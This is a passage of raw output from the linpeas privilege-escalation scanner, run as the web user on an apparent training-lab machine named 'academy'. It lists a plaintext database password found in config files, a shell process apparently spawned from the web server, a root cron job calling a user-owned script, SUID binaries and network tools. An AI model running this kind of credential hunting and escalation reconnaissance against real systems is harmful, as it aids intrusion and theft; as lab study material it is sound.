status half-installed base-passwd:amd64 3.5.46/var/log/dpkg.log.1:2021-05-29 17:00:11 configure base-passwd:amd64 3.5.46 3.5.46/var/log/dpkg.log.1:2021-05-29 17:00:11 status half-configured base-passwd:amd64 3.5.46/var/log/dpkg.log.1:2021-05-29 17:00:11 status installed base-passwd:amd64 3.5.46/var/log/dpkg.log.1:2021-05-29 17:00:11 status unpacked base-passwd:amd64 3.5.46/var/log/dpkg.log.1:2021-05-29 17:00:18 status half-configured base-passwd:amd64 3.5.46/var/log/dpkg.log.1:2021-05-29 17:00:18 status half-installed base-passwd:amd64 3.5.46/var/log/dpkg.log.1:2021-05-29 17:00:18 status unpacked base-passwd:amd64 3.5.46/var/log/dpkg.log.1:2021-05-29 17:00:18 upgrade base-passwd:amd64 3.5.46 3.5.46/var/log/dpkg.log.1:2021-05-29 17:00:21 install passwd:amd64 <none> 1:4.5-1.1/var/log/dpkg.log.1:2021-05-29 17:00:21 status half-installed passwd:amd64 1:4.5-1.1/var/log/dpkg.log.1:2021-05-29 17:00:21 status unpacked passwd:amd64 1:4.5-1.1/var/log/dpkg.log.1:2021-05-29 17:00:24 configure base-passwd:amd64 3.5.46 <none>/var/log/dpkg.log.1:2021-05-29 17:00:24 status half-configured base-passwd:amd64 3.5.46/var/log/dpkg.log.1:2021-05-29 17:00:24 status installed base-passwd:amd64 3.5.46/var/log/dpkg.log.1:2021-05-29 17:00:24 status unpacked base-passwd:amd64 3.5.46/var/log/dpkg.log.1:2021-05-29 17:00:25 configure passwd:amd64 1:4.5-1.1 <none>/var/log/dpkg.log.1:2021-05-29 17:00:25 status half-configured passwd:amd64 1:4.5-1.1/var/log/dpkg.log.1:2021-05-29 17:00:25 status installed passwd:amd64 1:4.5-1.1/var/log/dpkg.log.1:2021-05-29 17:00:25 status unpacked passwd:amd64 1:4.5-1.1/var/log/installer/status:Description: Set up users and passwords[+] Finding emails inside logs (limit 100)      1 /var/log/installer/status:aeb@debian.org                                                                                                                     1 /var/log/installer/status:anibal@debian.org      2 /var/log/installer/status:berni@debian.org     40 /var/log/installer/status:debian-boot@lists.debian.org     16 /var/log/installer/status:debian-kernel@lists.debian.org      1 /var/log/installer/status:debian-med-packaging@lists.alioth.debian.org      1 /var/log/installer/status:debian@jff.email      1 /var/log/installer/status:djpig@debian.org      4 /var/log/installer/status:gcs@debian.org      2 /var/log/installer/status:guillem@debian.org      1 /var/log/installer/status:guus@debian.org      1 /var/log/installer/status:linux-xfs@vger.kernel.org      2 /var/log/installer/status:mmind@debian.org      1 /var/log/installer/status:open-iscsi@packages.debian.org      1 /var/log/installer/status:open-isns@packages.debian.org      1 /var/log/installer/status:packages@release.debian.org      2 /var/log/installer/status:parted-maintainers@alioth-lists.debian.net      1 /var/log/installer/status:petere@debian.org      2 /var/log/installer/status:pkg-gnupg-maint@lists.alioth.debian.org      1 /var/log/installer/status:pkg-gnutls-maint@lists.alioth.debian.org      1 /var/log/installer/status:pkg-grub-devel@alioth-lists.debian.net      1 /var/log/installer/status:pkg-mdadm-devel@lists.alioth.debian.org      1 /var/log/installer/status:rogershimizu@gmail.com      2 /var/log/installer/status:team+lvm@tracker.debian.org      1 /var/log/installer/status:tytso@mit.edu      1 /var/log/installer/status:wpa@packages.debian.org      1 /var/log/installer/status:xnox@debian.org[+] Finding *password* or *credential* files in home                                                                                                                                                               [+] Finding 'pwd' or 'passw' string inside /home, /var/www, /etc, /root and list possible web(/var/www) and config(/etc) passwords/var/www/html/academy/admin/assets/fonts/fontawesome-webfont.woff2                                                                                             /var/www/html/academy/admin/assets/js/jquery-1.11.1.js/var/www/html/academy/admin/change-password.php/var/www/html/academy/admin/includes/config.php/var/www/html/academy/admin/index.php/var/www/html/academy/admin/manage-students.php/var/www/html/academy/admin/student-registration.php/var/www/html/academy/assets/fonts/fontawesome-webfont.woff2/var/www/html/academy/assets/js/jquery-1.11.1.js/var/www/html/academy/change-password.php/var/www/html/academy/db/onlinecourse.sql/var/www/html/academy/includes/config.php/var/www/html/academy/includes/menubar.php/var/www/html/academy/index.php/var/www/html/academy/pincode-verification.php/var/www/html/academy/admin/includes/config.php:$mysql_password = "My_V3ryS3cur3_P4ss";/var/www/html/academy/includes/config.php:$mysql_password = "My_V3ryS3cur3_P4ss";/etc/apache2/sites-available/default-ssl.conf:          #        Note that no password is obtained from the user. Every entry in the user/etc/apache2/sites-available/default-ssl.conf:          #        file needs this password: `xxj31ZMTZzkVA'./etc/apparmor.d/abstractions/authentication:  # databases containing passwords, PAM configuration files, PAM libraries/etc/debconf.conf:Accept-Type: password/etc/debconf.conf:Filename: /var/cache/debconf/passwords.dat/etc/debconf.conf:Name: passwords/etc/debconf.conf:Reject-Type: password/etc/debconf.conf:Stack: config, passwordsLinux Privesc Checklist: https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist LEYEND:                                                                                                                                                         RED/YELLOW: 99% a PE vector  RED: You must take a look at it  LightCyan: Users with console  Blue: Users without console & mounted devs  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs)   LightMangenta: Your username====================================( Basic information )=====================================OS: Linux version 4.19.0-16-amd64 (debian-kernel@lists.debian.org) (gcc version 8.3.0 (Debian 8.3.0-6)) #1 SMP Debian 4.19.181-1 (2021-03-19)                  User & Groups: uid=33(www-data) gid=33(www-data) groups=33(www-data)Hostname: academyWritable folder: /dev/shm[+] /usr/bin/ping is available for network discovery (You can use linpeas to discover hosts, learn more with -h)[+] /usr/bin/nc is available for network discover & port scanning (You can use linpeas to discover hosts/port scanning, learn more with -h)                                                                                                                                                                                   ====================================( System Information )====================================[+] Operative system                                                                                                                                           [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#kernel-exploits                                                                                Linux version 4.19.0-16-amd64 (debian-kernel@lists.debian.org) (gcc version 8.3.0 (Debian 8.3.0-6)) #1 SMP Debian 4.19.181-1 (2021-03-19)                      Distributor ID: DebianDescription:    Debian GNU/Linux 10 (buster)Release:        10Codename:       buster[+] Sudo versionsudo Not Found                                                                                                                                                                                                                                                                                                                [+] PATH[i] Any writable folder in original PATH? (a new completed path will be exported)                                                                              /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin                                                                                                   New path exported: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin[+] DateSat Jul 29 06:37:17 EDT 2023                                                                                                                                   [+] System statsFilesystem      Size  Used Avail Use% Mounted on                                                                                                               /dev/sda1       6.9G  1.9G  4.7G  29% /udev            479M     0  479M   0% /devtmpfs           494M     0  494M   0% /dev/shmtmpfs            99M  4.3M   95M   5% /runtmpfs           5.0M     0  5.0M   0% /run/locktmpfs           494M     0  494M   0% /sys/fs/cgrouptmpfs            99M     0   99M   0% /run/user/0              total        used        free      shared  buff/cache   availableMem:        1009960      178916      474532       10816      356512      640884Swap:        998396           0      998396[+] Environment[i] Any private information inside environment variables?                                                                                                      HISTFILESIZE=0                                                                                                                                                 APACHE_RUN_DIR=/var/run/apache2APACHE_PID_FILE=/var/run/apache2/apache2.pidJOURNAL_STREAM=9:13967PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binINVOCATION_ID=d29a7dcbdfb3443ebe10d76ee30417d9APACHE_LOCK_DIR=/var/lock/apache2LANG=CHISTSIZE=0APACHE_RUN_USER=www-dataAPACHE_RUN_GROUP=www-dataAPACHE_LOG_DIR=/var/log/apache2HISTFILE=/dev/null[+] Looking for Signature verification failed in dmseg Not Found                                                                                                                                                                                                                                                                                                                    [+] selinux enabled? .......... sestatus Not Found[+] Printer? .......... lpstat Not Found                                                                                                                       [+] Is this a container? .......... No                                                                                                                         [+] Is ASLR enabled? .......... Yes                                                                                                                            =========================================( Devices )==========================================[+] Any sd* disk in /dev? (limit 20)                                                                                                                           sda                                                                                                                                                            sda1sda2sda5[+] Unmounted file-system?[i] Check if you can mount umounted devices                                                                                                                    UUID=24d0cea7-c37b-4fd6-838e-d05cfb61a601 /               ext4    errors=remount-ro 0       1                                                                  UUID=930c51cc-089d-42bd-8e30-f08b86c52dca none            swap    sw              0       0/dev/sr0        /media/cdrom0   udf,iso9660 user,noauto     0       0====================================( Available Software )====================================[+] Useful software?                                                                                                                                           /usr/bin/nc                                                                                                                                                    /usr/bin/netcat/usr/bin/nc.traditional/usr/bin/wget/usr/bin/ping/usr/bin/base64/usr/bin/socat/usr/bin/python/usr/bin/python2/usr/bin/python3/usr/bin/python2.7/usr/bin/python3.7/usr/bin/perl/usr/bin/php[+] Installed compilers?Compilers Not Found                                                                                                                                                                                                                                                                                                           ================================( Processes, Cron & Services )================================[+] Cleaned processes                                                                                                                                          [i] Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes                                       USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND                                                                                       root         1  0.0  0.9 103796  9972 ?        Ss   05:18   0:01 /sbin/initroot       324  0.0  0.7  40376  7976 ?        Ss   05:18   0:00 /lib/systemd/systemd-journaldroot       349  0.0  0.4  21932  4952 ?        Ss   05:18   0:00 /lib/systemd/systemd-udevdsystemd+   434  0.0  0.6  93084  6556 ?        Ssl  05:18   0:00 /lib/systemd/systemd-timesyncdroot       465  0.0  0.2   8504  2736 ?        Ss   05:18   0:00 /usr/sbin/cron -froot       470  0.0  0.7  19492  7244 ?        Ss   05:18   0:00 /lib/systemd/systemd-logindmessage+   472  0.0  0.4   8980  4348 ?        Ss   05:18   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-onlyroot       473  0.0  0.4 225824  4332 ?        Ssl  05:18   0:00 /usr/sbin/rsyslogd -n -iNONEroot       475  0.0  0.2   6620  2808 ?        Ss   05:18   0:00 /usr/sbin/vsftpd /etc/vsftpd.confroot       477  0.0  0.3   6924  3376 tty1     Ss   05:18   0:00 /bin/login -p --root       486  0.0  0.6  15852  6876 ?        Ss   05:18   0:00 /usr/sbin/sshd -Droot       521  0.0  2.2 214992 23008 ?        Ss   05:18   0:00 /usr/sbin/apache2 -k startmysql      541  0.0  8.9 1274452 90652 ?       Ssl  05:18   0:03 /usr/sbin/mysqldwww-data   544  0.0  1.2 215348 13032 ?        S    05:18   0:00 /usr/sbin/apache2 -k startroot       634  0.0  0.8  21024  8488 ?        Ss   05:18   0:00 /lib/systemd/systemd --userroot       635  0.0  0.2  22832  2264 ?        S    05:18   0:00 (sd-pam)root       639  0.0  0.4   7652  4444 tty1     S+   05:18   0:00 -bashroot       643  0.0  0.5   9488  5592 ?        Ss   05:18   0:00 dhclientroot      1051  0.0  0.5   9488  5688 ?        Ss   06:07   0:00 dhclientwww-data  1075  0.0  1.2 215340 13024 ?        S    06:07   0:00 /usr/sbin/apache2 -k startwww-data  1128  0.0  1.6 215340 17168 ?        S    06:07   0:00 /usr/sbin/apache2 -k startwww-data  1129  0.0  1.9 215460 19852 ?        S    06:07   0:00 /usr/sbin/apache2 -k startwww-data  1137  0.0  1.9 215460 19540 ?        S    06:07   0:00 /usr/sbin/apache2 -k startwww-data  1147  0.0  1.9 215460 19652 ?        S    06:07   0:00 /usr/sbin/apache2 -k startwww-data  1151  0.0  2.3 218640 23700 ?        S    06:07   0:00 /usr/sbin/apache2 -k startwww-data  1157  0.0  1.2 215348 12772 ?        S    06:07   0:00 /usr/sbin/apache2 -k startwww-data  1163  0.0  1.2 215340 12756 ?        S    06:07   0:00 /usr/sbin/apache2 -k startwww-data  1172  0.0  1.9 215576 19836 ?        S    06:07   0:00 /usr/sbin/apache2 -k startwww-data  1583  0.0  0.0   2388   756 ?        S    06:33   0:00 sh -c uname -a; w; id; /bin/sh -iwww-data  1587  0.0  0.0   2388   752 ?        S    06:33   0:00 /bin/sh -iwww-data  1624  1.0  0.1   2520  1628 ?        S    06:37   0:00 /bin/sh ./linpeas.shwww-data  1805  0.0  0.2   7640  2728 ?        R    06:37   0:00 ps aux[+] Binary processes permissions[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes                                                                                       56K -rwxr-xr-x 1 root root  56K Jul 27  2018 /bin/login                                                                                                          0 lrwxrwxrwx 1 root root    4 May 29  2021 /bin/sh -> dash1.5M -rwxr-xr-x 1 root root 1.5M Mar 18  2021 /lib/systemd/systemd144K -rwxr-xr-x 1 root root 143K Mar 18  2021 /lib/systemd/systemd-journald228K -rwxr-xr-x 1 root root 227K Mar 18  2021 /lib/systemd/systemd-logind 56K -rwxr-xr-x 1 root root  55K Mar 18  2021 /lib/systemd/systemd-timesyncd664K -rwxr-xr-x 1 root root 663K Mar 18  2021 /lib/systemd/systemd-udevd   0 lrwxrwxrwx 1 root root   20 Mar 18  2021 /sbin/init -> /lib/systemd/systemd236K -rwxr-xr-x 1 root root 236K Jul  5  2020 /usr/bin/dbus-daemon672K -rwxr-xr-x 1 root root 672K Aug 25  2020 /usr/sbin/apache2 56K -rwxr-xr-x 1 root root  55K Oct 11  2019 /usr/sbin/cron 20M -rwxr-xr-x 1 root root  20M Nov 25  2020 /usr/sbin/mysqld688K -rwxr-xr-x 1 root root 686K Feb 26  2019 /usr/sbin/rsyslogd792K -rwxr-xr-x 1 root root 789K Jan 31  2020 /usr/sbin/sshd164K -rwxr-xr-x 1 root root 161K Mar  6  2019 /usr/sbin/vsftpd[+] Cron jobs[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#scheduled-jobs                                                                                 -rw-r--r-- 1 root root 1077 Jun 16  2021 /etc/crontab                                                                                                          /etc/cron.d:total 16drwxr-xr-x  2 root root 4096 May 29  2021 .drwxr-xr-x 74 root root 4096 Jul 29 06:34 ..-rw-r--r--  1 root root  102 Oct 11  2019 .placeholder-rw-r--r--  1 root root  712 Dec 17  2018 php/etc/cron.daily:total 40drwxr-xr-x  2 root root 4096 May 29  2021 .drwxr-xr-x 74 root root 4096 Jul 29 06:34 ..-rw-r--r--  1 root root  102 Oct 11  2019 .placeholder-rwxr-xr-x  1 root root  539 Aug  8  2020 apache2-rwxr-xr-x  1 root root 1478 May 12  2020 apt-compat-rwxr-xr-x  1 root root  355 Dec 29  2017 bsdmainutils-rwxr-xr-x  1 root root 1187 Apr 18  2019 dpkg-rwxr-xr-x  1 root root  377 Aug 28  2018 logrotate-rwxr-xr-x  1 root root 1123 Feb 10  2019 man-db-rwxr-xr-x  1 root root  249 Sep 27  2017 passwd/etc/cron.hourly:total 12drwxr-xr-x  2 root root 4096 May 29  2021 .drwxr-xr-x 74 root root 4096 Jul 29 06:34 ..-rw-r--r--  1 root root  102 Oct 11  2019 .placeholder/etc/cron.monthly:total 12drwxr-xr-x  2 root root 4096 May 29  2021 .drwxr-xr-x 74 root root 4096 Jul 29 06:34 ..-rw-r--r--  1 root root  102 Oct 11  2019 .placeholder/etc/cron.weekly:total 16drwxr-xr-x  2 root root 4096 May 29  2021 .drwxr-xr-x 74 root root 4096 Jul 29 06:34 ..-rw-r--r--  1 root root  102 Oct 11  2019 .placeholder-rwxr-xr-x  1 root root  813 Feb 10  2019 man-dbSHELL=/bin/shPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin* * * * * /home/grimmie/backup.sh[+] Services[i] Search for outdated versions                                                                                                                                [ - ]  apache-htcacheclean                                                                                                                                     [ + ]  apache2 [ + ]  apparmor [ - ]  console-setup.sh [ + ]  cron [ + ]  dbus [ - ]  hwclock.sh [ - ]  keyboard-setup.sh [ + ]  kmod [ + ]  mysql [ + ]  networking [ + ]  procps [ - ]  rsync [ + ]  rsyslog [ + ]  ssh [ + ]  udev [ + ]  vsftpd===================================( Network Information )====================================[+] Hostname, hosts and DNS                                                                                                                                    academy                                                                                                                                                        127.0.0.1       localhost127.0.1.1       academy.tcm.sec academy::1     localhost ip6-localhost ip6-loopbackff02::1 ip6-allnodesff02::2 ip6-allroutersdomain localdomainsearch localdomainnameserver 172.16.2.2tcm.sec[+] Content of /etc/inetd.conf/etc/inetd.conf Not Found                                                                                                                                                                                                                                                                                                     [+] Networks and neighboursdefault         0.0.0.0                                                                                                                                        loopback        127.0.0.0link-local      169.254.0.01: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00    inet 127.0.0.1/8 scope host lo       valid_lft forever preferred_lft forever    inet6 ::1/128 scope host        valid_lft forever preferred_lft forever2: ens33: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000    link/ether 00:0c:29:a6:6e:61 brd ff:ff:ff:ff:ff:ff    inet 172.16.2.129/24 brd 172.16.2.255 scope global dynamic ens33       valid_lft 1638sec preferred_lft 1638sec    inet6 fe80::20c:29ff:fea6:6e61/64 scope link        valid_lft forever preferred_lft forever172.16.2.254 dev ens33 lladdr 00:50:56:ed:99:be STALE172.16.2.2 dev ens33 lladdr 00:50:56:fc:a4:5b REACHABLE172.16.2.1 dev ens33 lladdr 00:50:56:c0:00:08 REACHABLE[+] Iptables rulesiptables rules Not Found                                                                                                                                                                                                                                                                                                      [+] Active Ports[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#internal-open-ports                                                                                                                                                                                                                                           [+] Can I sniff with tcpdump?No                                                                                                                                                                                                                                                                                                                            ====================================( Users Information )=====================================[+] My user                                                                                                                                                    [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#groups                                                                                         uid=33(www-data) gid=33(www-data) groups=33(www-data)                                                                                                          [+] Do I have PGP keys?gpg Not Found                                                                                                                                                                                                                                                                                                                 [+] Clipboard or highlighted text?xsel and xclip Not Found                                                                                                                                                                                                                                                                                                      [+] Testing 'sudo -l' without password & /etc/sudoers[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#commands-with-sudo-and-suid-commands                                                                                                                                                                                                                          [+] Checking /etc/doas.conf/etc/doas.conf Not Found                                                                                                                                                                                                                                                                                                      [+] Checking Pkexec policy                                                                                                                                                               [+] Don forget to test 'su' as any other user with shell: without password and with their names as password (I can't do it...)[+] Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!                                                                                                                                                                                                                             [+] Superusersroot:x:0:0:root:/root:/bin/bash                                                                                                                                [+] Users with consolegrimmie:x:1000:1000:administrator,,,:/home/grimmie:/bin/bash                                                                                                   root:x:0:0:root:/root:/bin/bash[+] Login information 06:37:18 up  1:19,  1 user,  load average: 0.24, 0.06, 0.41                                                                                                   USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHATroot     tty1     -                10:18   29:42   0.04s  0.01s -bashroot     tty1                          Sat May 29 13:31 - down   (00:12)reboot   system boot  4.19.0-16-amd64  Sat May 29 13:30 - 13:43  (00:13)root     pts/0        192.168.10.31    Sat May 29 13:16 - 13:27  (00:11)root     tty1                          Sat May 29 13:16 - down   (00:11)reboot   system boot  4.19.0-16-amd64  Sat May 29 13:15 - 13:27  (00:12)root     pts/0        192.168.10.31    Sat May 29 13:08 - 13:14  (00:06)administ tty1                          Sat May 29 13:06 - down   (00:08)reboot   system boot  4.19.0-16-amd64  Sat May 29 13:05 - 13:14  (00:08)wtmp begins Sat May 29 13:05:58 2021[+] All users_apt                                                                                                                                                           backupbindaemonftpgamesgnatsgrimmieirclistlpmailmanmessagebusmysqlnewsnobodyproxyrootsshdsyncsyssystemd-coredumpsystemd-networksystemd-resolvesystemd-timesyncuucpwww-data[+] Password policyPASS_MAX_DAYS   99999                                                                                                                                          PASS_MIN_DAYS   0PASS_WARN_AGE   7ENCRYPT_METHOD SHA512===================================( Software Information )===================================[+] MySQL version                                                                                                                                              mysql  Ver 15.1 Distrib 10.3.27-MariaDB, for debian-linux-gnu (x86_64) using readline 5.2                                                                      [+] MySQL connection using default root/root ........... No[+] MySQL connection using root/toor ................... No                                                                                                    [+] MySQL connection using root/NOPASS ................. No                                                                                                    [+] Looking for mysql credentials and exec                                                                                                                     From '/etc/mysql/mariadb.conf.d/50-server.cnf' Mysql user: user                    = mysql                                                                     Found readable /etc/mysql/my.cnf[client-server]!includedir /etc/mysql/conf.d/!includedir /etc/mysql/mariadb.conf.d/[+] PostgreSQL version and pgadmin credentials Not Found                                                                                                                                                                                                                                                                                                                    [+] PostgreSQL connection to template0 using postgres/NOPASS ........ No[+] PostgreSQL connection to template1 using postgres/NOPASS ........ No                                                                                       [+] PostgreSQL connection to template0 using pgsql/NOPASS ........... No                                                                                       [+] PostgreSQL connection to template1 using pgsql/NOPASS ........... No                                                                                                                                                                                                                                                      [+] Apache server infoVersion: Server version: Apache/2.4.38 (Debian)                                                                                                                Server built:   2020-08-25T20:08:29[+] Looking for PHPCookies Not Found                                                                                                                                                                                                                                                                                                                    [+] Looking for Wordpress wp-config.php fileswp-config.php Not Found                                                                                                                                                                                                                                                                                                       [+] Looking for Tomcat users filetomcat-users.xml Not Found                                                                                                                                                                                                                                                                                                    [+] Mongo information Not Found                                                                                                                                                                                                                                                                                                                    [+] Looking for supervisord configuration filesupervisord.conf Not Found                                                                                                                                                                                                                                                                                                    [+] Looking for cesi configuration filecesi.conf Not Found                                                                                                                                                                                                                                                                                                           [+] Looking for Rsyncd config file/usr/share/doc/rsync/examples/rsyncd.conf                                                                                                                      [ftp]        comment = public archive        path = /var/www/pub        use chroot = yes        lock file = /var/lock/rsyncd        read only = yes        list = yes        uid = nobody        gid = nogroup        strict modes = yes        ignore errors = no        ignore nonreadable = yes        transfer logging = no        timeout = 600        refuse options = checksum dry-run        dont compress = *.gz *.tgz *.zip *.z *.rpm *.deb *.iso *.bz2 *.tbz[+] Looking for Hostapd config filehostapd.conf Not Found                                                                                                                                                                                                                                                                                                        [+] Looking for wifi conns file Not Found                                                                                                                                                                                                                                                                                                                    [+] Looking for Anaconda-ks config filesanaconda-ks.cfg Not Found                                                                                                                                                                                                                                                                                                     [+] Looking for .vnc directories and their passwd files.vnc Not Found                                                                                                                                                                                                                                                                                                                [+] Looking for ldap directories and their hashes/etc/ldap                                                                                                                                                      The password hash is from the {SSHA} to 'structural'[+] Looking for .ovpn files and credentials.ovpn Not Found                                                                                                                                                                                                                                                                                                               [+] Looking for ssl/ssh filesPermitRootLogin yes                                                                                                                                            ChallengeResponseAuthentication noUsePAM yesLooking inside /etc/ssh/ssh_config for interesting infoHost *    SendEnv LANG LC_*    HashKnownHosts yes    GSSAPIAuthentication yes[+] Looking for unexpected auth lines in /etc/pam.d/sshdNo                                                                                                                                                                                                                                                                                                                            [+] Looking for Cloud credentials (AWS, Azure, GC)                                                                                                                                                               [+] NFS exports?[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe                                                         /etc/exports Not Found                                                                                                                                                                                                                                                                                                        [+] Looking for kerberos conf files and tickets[i] https://book.hacktricks.xyz/pentesting/pentesting-kerberos-88#pass-the-ticket-ptt                                                                          krb5.conf Not Found                                                                                                                                            tickets kerberos Not Found                                                                                                                                     klist Not Found                                                                                                                                                                                                                                                                                                               [+] Looking for Kibana yamlkibana.yml Not Found                                                                                                                                                                                                                                                                                                          [+] Looking for logstash files Not Found                                                                                                                                                                                                                                                                                                                    [+] Looking for elasticsearch files Not Found                                                                                                                                                                                                                                                                                                                    [+] Looking for Vault-ssh filesvault-ssh-helper.hcl Not Found                                                                                                                                                                                                                                                                                                [+] Looking for AD cached hahsescached hashes Not Found                                                                                                                                                                                                                                                                                                       [+] Looking for screen sessions[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-shell-sessions                                                                            screen Not Found                                                                                                                                                                                                                                                                                                              [+] Looking for tmux sessions[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-shell-sessions                                                                            tmux Not Found                                                                                                                                                                                                                                                                                                                [+] Looking for Couchdb directory                                                                                                                                                               [+] Looking for redis.conf                                                                                                                                                               [+] Looking for dovecot filesdovecot credentials Not Found                                                                                                                                                                                                                                                                                                 [+] Looking for mosquitto.conf                                                                                                                                                               ====================================( Interesting Files )=====================================[+] SUID                                                                                                                                                       [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#commands-with-sudo-and-suid-commands                                                           /usr/lib/dbus-1.0/dbus-daemon-launch-helper                                                                                                                    /usr/lib/eject/dmcrypt-get-device/usr/lib/openssh/ssh-keysign/usr/bin/chfn           --->    SuSE_9.3/10/usr/bin/mount          --->    Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8/usr/bin/newgrp         --->    HP-UX_10.20/usr/bin/umount         --->    BSD/Linux[1996-08-13]/usr/bin/chsh/usr/bin/passwd         --->    Apple_Mac_OSX/Solaris/SPARC_8/9/Sun_Solaris_2.5.1_PAM/usr/bin/su/usr/bin/gpasswd[+] SGID[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#commands-with-sudo-and-suid-commands                                                           /usr/sbin/unix_chkpwd                                                                                                                                          /usr/bin/bsd-write/usr/bin/expiry/usr/bin/wall/usr/bin/crontab/usr/bin/dotlockfile/usr/bin/chage/usr/bin/ssh-agent[+] Capabilities[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities                                                                                   /usr/bin/ping = cap_net_raw+ep                                                                                                                                 [+] .sh files in path/usr/bin/gettext.sh                                                                                                                                            [+] Files (scripts) in /etc/profile.d/total 20                                                                                                                                                       drwxr-xr-x  2 root root 4096 May 29  2021 .drwxr-xr-x 74 root root 4096 Jul 29 06:34 ..-rw-r--r--  1 root root  664 Mar  1  2019 bash_completion.sh-rw-r--r--  1 root root 1107 Sep 14  2018 gawk.csh-rw-r--r--  1 root root  757 Sep 14  2018 gawk.sh[+] Hashes inside passwd file? ........... No[+] Can I read shadow files? ........... No                                                                                                                    [+] Can I read root folder? ........... No                                                                                                                                                                                                                                                                                    [+] Looking for root files in home dirs (limit 20)/home                                                                                                                                                          [+] Looking for root files in folders owned by me                                                                                                                                                               [+] Readable files belonging to root and readable by me but not world readable                                                                                                                                                               [+] Files inside /home/www-data (limit 20)                                                                                                                                                               [+] Files inside others home (limit 20)/home/grimmie/.bash_history                                                                                                                                    /home/grimmie/.bashrc/home/grimmie/backup.sh/home/grimmie/.profile/home/grimmie/.bash_logout[+] Looking for installed mail applications                                                                                                                                                               [+] Mails (limit 50)                                                                                                                                                               [+] Backup files?-rwxr-xr-- 1 grimmie administrator 112 May 30  2021 /home/grimmie/backup.sh                                                                                    -rwxr-xr-x 1 root root 38412 Nov 25  2020 /usr/bin/wsrep_sst_mariabackup[+] Looking for tables inside readable .db/.sqlite files (limit 100)                                                                                                                                                               [+] Web files?(output limit)/var/www/:                                                                                                                                                     total 12Kdrwxr-xr-x  3 root root 4.0K May 29  2021 .drwxr-xr-x 12 root root 4.0K May 29  2021 ..drwxr-xr-x  3 root root 4.0K May 29  2021 html/var/www/html:total 24Kdrwxr-xr-x 3 root     root     4.0K May 29  2021 .drwxr-xr-x 3 root     root     4.0K May 29  2021 ..[+] *_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .gitconfig, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml                                                                                                                                                   [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#read-sensitive-data                                                                            -rw-r--r-- 1 root root 1994 Apr 18  2019 /etc/bash.bashrc                                                                                                      -rw-r--r-- 1 root root 3526 Apr 18  2019 /etc/skel/.bashrc-rw-r--r-- 1 root root 807 Apr 18  2019 /etc/skel/.profile-rw-r--r-- 1 grimmie administrator 3526 May 29  2021 /home/grimmie/.bashrc-rw-r--r-- 1 grimmie administrator 807 May 29  2021 /home/grimmie/.profile-rw-r--r-- 1 root root 2778 Jun 26  2016 /usr/share/doc/adduser/examples/adduser.local.conf.examples/bash.bashrc-rw-r--r-- 1 root root 802 Jun 26  2016 /usr/share/doc/adduser/examples/adduser.local.conf.examples/skel/dot.bashrc-rw-r--r-- 1 root root 570 Jan 31  2010 /usr/share/base-files/dot.bashrc[+] All hidden files (not in /sys/ or the ones listed in the previous check) (limit 70)   139266      4 -rw-r--r--   1 grimmie  administrator      220 May 29  2021 /home/grimmie/.bash_logout                                                           270249      4 -rw-r--r--   1 root     root               240 Oct 15  2020 /usr/share/phpmyadmin/vendor/paragonie/constant_time_encoding/.travis.yml   270133      4 -rw-r--r--   1 root     root               250 Oct 15  2020 /usr/share/phpmyadmin/vendor/bacon/bacon-qr-code/.travis.yml   389530      4 -rw-r--r--   1 root     root               946 Oct 15  2020 /usr/share/phpmyadmin/vendor/pragmarx/google2fa/.scrutinizer.yml   389531      4 -rw-r--r--   1 root     root               706 Oct 15  2020 /usr/share/phpmyadmin/vendor/pragmarx/google2fa/.travis.yml   140294      4 -rw-r--r--   1 root     root               608 Oct 15  2020 /usr/share/phpmyadmin/vendor/twig/extensions/.travis.yml   140341      4 -rw-r--r--   1 root     root              1004 Oct 15  2020 /usr/share/phpmyadmin/vendor/twig/twig/.travis.yml   140340      4 -rw-r--r--   1 root     root               799 Oct 15  2020 /usr/share/phpmyadmin/vendor/twig/twig/.php_cs.dist   140339      4 -rw-r--r--   1 root     root               224 Oct 15  2020 /usr/share/phpmyadmin/vendor/twig/twig/.editorconfig   270226      4 -rw-r--r--   1 root     root               633 Oct 15  2020 /usr/share/phpmyadmin/vendor/google/recaptcha/.travis.yml   138381      0 -rw-r--r--   1 root     root                 0 Nov 15  2018 /usr/share/dictionaries-common/site-elisp/.nosearch    12136      0 -rw-r--r--   1 root     root                 0 Jul 29  2023 /run/network/.ifstate.lock   260079      0 -rw-------   1 root     root                 0 May 29  2021 /etc/.pwd.lock   259843      4 -rw-r--r--   1 root     root               220 Apr 18  2019 /etc/skel/.bash_logout[+] Readable files inside /tmp, /var/tmp, /var/backups(limit 100)-rwxrwxrwx 1 www-data www-data 134167 Jul 29 06:32 